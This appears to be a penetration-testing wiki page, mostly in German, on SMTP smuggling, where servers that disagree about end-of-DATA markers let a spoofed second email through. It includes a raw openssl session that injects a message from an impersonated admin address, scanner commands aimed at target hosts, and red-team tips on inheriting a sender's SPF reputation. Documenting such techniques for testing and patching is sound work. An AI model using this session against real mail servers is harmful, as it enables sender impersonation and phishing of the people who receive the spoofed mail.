# SMTP Smuggling

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Diese Art von Verwundbarkeit wurde [**originally discovered in this post**](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/) entdeckt, wo erklärt wird, dass es möglich ist, **Unstimmigkeiten in der Interpretation des SMTP‑Protokolls auszunutzen**, wenn eine E‑Mail finalisiert wird. Dadurch kann ein Angreifer zusätzliche E‑Mails in den Körper der legitimen E‑Mail einschmuggeln und andere Benutzer der betroffenen Domain (z. B. admin@outlook.com) imitieren, wodurch Schutzmechanismen wie SPF umgangen werden.

### Warum

Das liegt daran, dass im SMTP‑Protokoll die **Daten der Nachricht**, die in der E‑Mail gesendet werden, vom Benutzer (Angreifer) kontrolliert werden können. Dieser kann speziell gestaltete Daten senden, die Parser‑Unterschiede ausnutzen und zusätzliche E‑Mails beim Empfänger einschmuggeln. Siehe dieses illustrierte Beispiel aus dem Original‑Post:

<figure><img src="../../images/image (8) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png">https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png</a></p></figcaption></figure>

### Wie

Um diese Verwundbarkeit auszunutzen, muss ein Angreifer Daten senden, die der **ausgehende SMPT‑Server für eine einzige E‑Mail hält, während der eingehende SMTP‑Server sie als mehrere E‑Mails interpretiert**.

Die Forscher entdeckten, dass verschiedene **Inboud‑Server unterschiedliche Zeichen als Ende der Daten** der E‑Mail‑Nachricht betrachten, die Outbound‑Server nicht.\
Zum Beispiel ist ein normales Ende der Daten `\r\n.\r`. Wenn der Inbound SMTP‑Server jedoch auch `\n.` unterstützt, könnte ein Angreifer genau diese Sequenz in seine E‑Mail einfügen und danach die SMTP‑Befehle für eine neue Nachricht (MAIL/RCPT/DATA...) beginnen, um diese wie im vorherigen Bild einzuschmuggeln.

Natürlich funktioniert das nur, wenn der **ausgehende SMTP‑Server diese Sequenz nicht ebenfalls als Ende der Nachrichtendaten behandelt**, denn sonst würde er 2 E‑Mails statt nur einer sehen — letztlich wird hier also eine Desynchronisation ausgenutzt.

Mögliche Desynchronisations‑Sequenzen:

- `\n.`
- `\n.\r`

Beachte auch, dass SPF umgangen wird, weil wenn du eine E‑Mail von `admin@outlook.com` in eine E‑Mail von `user@outlook.com` einschmuggelst, **der Sender weiterhin `outlook.com` ist.**

---

## Checkliste des Angreifers (welche Bedingungen müssen erfüllt sein?)

Um erfolgreich eine zweite E‑Mail einzuschmuggeln, brauchst du typischerweise:

- Einen ausgehenden Server A, über den du senden kannst (oft mit gültigen Zugangsdaten/creds), der eine nicht‑standardmäßige End‑of‑DATA‑Sequenz unverändert weiterleitet. Viele Services haben historisch Varianten wie `\n.\r\n` oder `\n.\n` weitergeleitet.
- Einen empfangenden Server B, der diese nicht‑standardmäßige Sequenz als Ende‑von‑DATA interpretiert und dann alles, was folgt, als neue SMTP‑Befehle (MAIL/RCPT/DATA...) parst.
- Outbound muss tatsächlich mit `DATA` senden (nicht `BDAT`). Wenn A CHUNKING/BDAT unterstützt, funktioniert smuggling nur, wenn es auf DATA zurückfällt (z. B. B wirbt nicht mit CHUNKING), sonst verhindert die längenbasierte BDAT‑Rahmung Mehrdeutigkeit.
- PIPELINING ist nicht erforderlich, hilft aber dabei, die injizierten Befehle in einem einzigen TCP‑Write zu verstecken, sodass Zwischenstellen nicht resynchronisieren.

Gängige End‑of‑DATA‑Varianten, die es wert sind getestet zu werden (empfängerabhängig):

- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r` (bare CR at end)

Hinweis: Funktioniert nur die Schnittmenge von „was A weiterleitet“ ∩ „was B akzeptiert“.

---

## Manuelles Exploit‑Beispiel (einzelne Sitzung)

Das Folgende zeigt die Idee anhand einer rohen STARTTLS‑SMTP‑Sitzung. Nach dem ersten DATA‑Block fügen wir einen nicht‑standardmäßigen Terminator ein, gefolgt von einem weiteren SMTP‑Dialog, den der empfangende Server als neue Nachricht interpretieren könnte.

<details>
<summary>Manuelle smuggling‑Sitzung (STARTTLS)</summary>
```
$ openssl s_client -starttls smtp -crlf -connect smtp.example.com:587
EHLO a.example
AUTH PLAIN <base64(\0user@example.com\0password)>
MAIL FROM:<user@example.com>
RCPT TO:<victim@target.com>
DATA
From: User <user@example.com>
To: victim <victim@target.com>
Subject: legit

hello A
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: smuggled

hello B
\r\n.\r\n
```
If A forwards `\n.\r\n` and B accepts it as end‑of‑DATA, message “hello B” may be accepted as a second email from `admin@target.com` while passing SPF (aligned with A’s IPs).
</details>

Tip: When testing interactively, ensure `-crlf` is used so OpenSSL preserves CRLF in what you type.

---

## Automatisierung und Scanner

- hannob/smtpsmug: send a message ending with multiple malformed end‑of‑DATA sequences to see what a receiver accepts.
- Example: `./smtpsmug -s mail.target.com -p 25 -t victim@target.com`
- The‑Login/SMTP‑Smuggling‑Tools: scanner for both inbound and outbound sides plus an analysis SMTP server to see exactly which sequences survive a sender.
- Inbound quick check: `python3 smtp_smuggling_scanner.py victim@target.com`
- Outbound via a relay: `python3 smtp_smuggling_scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com --password '...'
`

These tools help you map the A→B pairs where smuggling actually works.

---

## CHUNKING/BDAT vs DATA

- DATA uses a sentinel terminator `<CR><LF>.<CR><LF>`; any ambiguity in how CR/LF are normalized or dot‑stuffed leads to desync.
- CHUNKING (BDAT) frames the body with an exact byte length and therefore prevents classic smuggling. However, if the sender falls back to DATA (because the receiver doesn’t advertise CHUNKING), classic smuggling becomes possible again.

---

## Hinweise zu betroffener Software und Fixes (für Targeting)

- Postfix: vor 3.9 tolerierte die Standardeinstellung bare LFs; ab 3.5.23/3.6.13/3.7.9/3.8.4 können Admins `smtpd_forbid_bare_newline` aktivieren. Aktuelle Empfehlung ist `smtpd_forbid_bare_newline = normalize` (3.8.5+/3.7.10+/3.6.14+/3.5.24+) oder für strikte RFC‑Durchsetzung auf `reject` setzen.
- Exim: fixed in 4.97.1 (and later) for variants relying on mixed end‑of‑DATA sequences when DATA is used. Ältere 4.97/4.96‑Versionen können je nach PIPELINING/CHUNKING ausnutzbar sein.
- Sendmail: fixed in 8.18; ältere 8.17.x akzeptierten einige nicht‑standardmäßige Terminatoren.
- Verschiedene Bibliotheken/Server (z. B. aiosmtpd vor 1.4.5, einige Vendor‑Gateways und bestimmte SaaS‑Relays) hatten ähnliche Probleme; moderne Versionen akzeptieren DATA meist nur mit strikt `<CR><LF>.<CR><LF>`.

Verwende die oben genannten Scanner, um das aktuelle Verhalten zu überprüfen; viele Anbieter haben ihre Defaults Anfang 2024–2025 geändert.

---

## Tipps für red team ops

- Bevorzuge große Commodity‑Sender für A (historisch Exchange Online, shared hoster etc.). Wenn sie weiterhin einige nicht‑standardmäßige EOM weiterleiten und in der SPF des Opfers stehen, erbt deine geschmuggelte MAIL FROM deren Reputation.
- Enumeriere B’s SMTP‑Extensions: `EHLO`‑Banner für PIPELINING/CHUNKING; wenn CHUNKING fehlt, hast du von BDAT‑first‑Sendern bessere Chancen. Kombiniere das mit malformed EOMs zum Abtasten der Akzeptanz.
- Achte auf Header: die geschmuggelte Nachricht erzeugt in der Regel eine separate Received‑Kette beginnend bei B. DMARC besteht häufig, weil MAIL FROM mit A’s IP‑Bereich aligned ist.

---

## **Referenzen**

- [https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [https://www.postfix.org/smtp-smuggling.html](https://www.postfix.org/smtp-smuggling.html)

{{#include ../../banners/hacktricks-training.md}}
